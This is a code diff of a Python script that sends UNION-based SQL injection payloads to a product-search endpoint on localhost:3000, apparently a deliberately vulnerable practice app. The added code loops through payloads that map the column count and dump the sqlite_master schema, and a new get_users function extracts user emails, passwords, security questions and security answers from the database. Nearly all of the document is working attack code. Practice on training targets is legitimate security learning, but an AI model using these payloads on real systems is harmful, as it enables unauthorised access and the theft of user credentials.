@@ -6,9 +6,10 @@ def main ():
     if not check_search_query():
         print("Search query is not injectable")
 
-    union_based_attack()
     random_union_based_attack()
-    # search query is injectable
+
+    get_users()
+    
     
 def check_search_query():
     url = "http://localhost:3000/rest/products/search?q="
@@ -38,19 +39,6 @@ def check_search_query():
         return True
     return False
 
-def union_based_attack():
-    url = "http://localhost:3000/rest/products/search?q=\')) UNION SELECT null, sql, null, null FROM sqlite_master--"
-    
-    try:
-        response = requests.get(url, headers={'Accept': 'application/json'})
-        response.raise_for_status()
-    except requests.exceptions.HTTPError as e:
-        print("Error", e.response.json())
-        return
-
-    json = response.json()
-    print(json)
-
 
 def random_union_based_attack():
     payloads = [
@@ -64,6 +52,29 @@ def random_union_based_attack():
         "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8;--",
         "a\')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9;--",
         "a\')) UNION SELECT sql, 2, 3, 4, 5, 6, 7, 8, 9 from sqlite_master;--" # this final one gives us the schema
+    ]
+    url = "http://localhost:3000/rest/products/search?q="
+    for payload in payloads:
+        
+        full_url = url + payload
+
+        print("testing payload: ", full_url)
+        
+        try:
+            response = requests.get(full_url, headers={'Accept': 'application/json'})
+            response.raise_for_status()
+        except requests.exceptions.HTTPError as e:
+            print("Error", e.response.json())
+            continue
+        
+        json = response.json()
+        print_json_nicely(json)
+
+def get_users():
+    payloads = [
+        "a\')) UNION SELECT id, email, password, 4, 5, 6, 7, 8, 9 FROM Users--",
+        "a\')) UNION SELECT UserId, SecurityQuestionId, answer, 4, 5, 6, 7, 8, 9 FROM SecurityAnswers--",
+        "a\')) UNION SELECT id, question, 3, 4, 5, 6, 7, 8, 9 FROM SecurityQuestions--"
     ]
     url = "http://localhost:3000/rest/products/search?q="
     for payload in payloads:
